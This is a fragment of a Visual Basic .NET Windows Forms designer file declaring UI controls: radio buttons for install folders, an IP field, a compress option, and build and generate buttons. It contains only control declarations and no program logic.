    Friend WithEvents Panel1 As System.Windows.Forms.Panel
    Friend WithEvents rb_programs As System.Windows.Forms.RadioButton
    Friend WithEvents rb_programfiles As System.Windows.Forms.RadioButton
    Friend WithEvents rb_temp As System.Windows.Forms.RadioButton
    Friend WithEvents rb_appdataroaming As System.Windows.Forms.RadioButton
    Friend WithEvents rb_appdata As System.Windows.Forms.RadioButton
    Friend WithEvents GroupBox6 As System.Windows.Forms.GroupBox
    Friend WithEvents PictureBox1 As System.Windows.Forms.PictureBox
    Friend WithEvents Label18 As System.Windows.Forms.Label
    Friend WithEvents GroupBox7 As System.Windows.Forms.GroupBox
    Friend WithEvents btn_build As System.Windows.Forms.Button
    Friend WithEvents btn_generate As System.Windows.Forms.Button
    Friend WithEvents cb_compress As System.Windows.Forms.CheckBox
    Friend WithEvents RichTextBox1 As System.Windows.Forms.RichTextBox
    Friend WithEvents tb_ip As System.Windows.Forms.ComboBox
    Friend WithEvents Label19 As System.Windows.Forms.Label
    Friend WithEvents PictureBox2 As System.Windows.Forms.PictureBox
End Class
